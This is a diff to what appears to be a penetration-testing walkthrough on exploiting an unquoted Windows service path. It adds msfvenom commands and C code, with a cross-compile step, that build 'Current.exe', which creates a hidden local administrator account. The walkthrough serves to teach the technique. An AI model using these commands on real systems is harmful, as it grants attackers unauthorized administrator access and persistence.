@@ -35,29 +35,35 @@ net start GammaService
 ### Step 3: Create the Malicious Executable
 The goal is to create an executable file that matches part of the unquoted path. In this case, we'll name the file `Current.exe` and place it in `C:\Program Files\Enterprise Apps`.
 
-Option 1 msfvenom
-```bash
-```
++
+    ### Option 1 msfvenom
+    ```bash
+    msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o <FileName>.exe
+    ```
+    ```bash
+    msfvenom -p windows/exec CMD="cmd.exe /c net user taskmgrsvc Password123! /add && net localgroup administrators taskmgrsvc /add" -f exe-service -o Current.exe
+    ```
 
-Option 2 Manual Compile
-#### Malicious Executable Code
-We will use C code to create a new local administrative user:
-```c
-#include <stdlib.h>
++
+    ### Option 2 Manual Compile
+    #### Malicious Executable Code
+    We will use C code to create a new local administrative user:
+    ```c
+    #include <stdlib.h>
 
-int main() {
-    system("net user taskmgrsvc Password123! /add");
-    system("net localgroup administrators taskmgrsvc /add");
-    return 0;
-}
-```
+    int main() {
+        system("net user taskmgrsvc Password123! /add");
+        system("net localgroup administrators taskmgrsvc /add");
+        return 0;
+    } 
+    ```
 
-#### Compile the Executable
-On your Kali machine, cross-compile the C code:
+    #### Compile the Executable
+    On your Kali machine, cross-compile the C code:
 
-```bash
-x86_64-w64-mingw32-gcc adduser.c -o Current.exe
-```
+    ```bash
+    x86_64-w64-mingw32-gcc adduser.c -o Current.exe
+    ```
 
 ---
 
